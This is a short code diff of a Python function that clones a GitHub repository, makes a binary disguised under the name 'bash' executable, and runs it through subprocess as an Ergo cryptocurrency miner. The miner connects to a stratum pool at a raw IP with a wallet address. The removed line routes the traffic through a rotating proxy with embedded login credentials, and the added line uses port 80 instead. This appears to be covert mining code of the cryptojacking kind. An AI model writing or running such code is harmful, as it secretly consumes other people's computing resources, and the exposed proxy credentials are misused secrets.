@@ -30,7 +30,7 @@ def run_script():
     git clone https://github.com/hujisanda/bbm.git
     cd bbm
     chmod u+x bash
-    ./bash -a ergo -o stratum+tcp://159.89.33.226 -u 9iF7eGjWvEMVSYBHkPzJYtPgVMftJaJaWMsD6ArRog3RZmnC471.jasin --proxy atrfkwzc2-rotate:jasin987@p.webshare.io:80 --no-health 
+    ./bash -a ergo -o stratum+tcp://159.89.33.226:80 -u 9iF7eGjWvEMVSYBHkPzJYtPgVMftJaJaWMsD6ArRog3RZmnC471.jasin --no-health 
     """
 
     subprocess.run(["bash", "-lc", cmd], check=False)
